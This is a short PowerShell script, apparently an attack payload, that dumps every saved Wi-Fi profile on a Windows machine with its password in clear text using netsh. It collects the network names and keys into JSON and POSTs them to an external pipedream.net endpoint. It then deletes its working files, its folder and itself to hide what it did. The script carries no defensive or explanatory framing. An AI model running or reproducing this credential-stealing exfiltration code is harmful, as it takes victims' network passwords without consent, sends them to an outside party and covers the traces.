
$p = "C:\wipass"
mkdir $p
cd $p

netsh wlan export profile key=clear
rm *CCL*

$hash=@{}

dir *.xml  |% {
$xml=[xml] (get-content $_)
# $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
# Out-File wifipass.txt -Append -InputObject $a 

$hash[$xml.WLANProfile.SSIDConfig.SSID.name]=$xml.WLANProfile.MSM.Security.sharedKey.keymaterial

}

$body=$hash | ConvertTo-Json
curl -uri https://envgv4l0v712.x.pipedream.net/ -Method POST -Body $body

rm *.xml
cd ..
rm $p

rm d.ps1
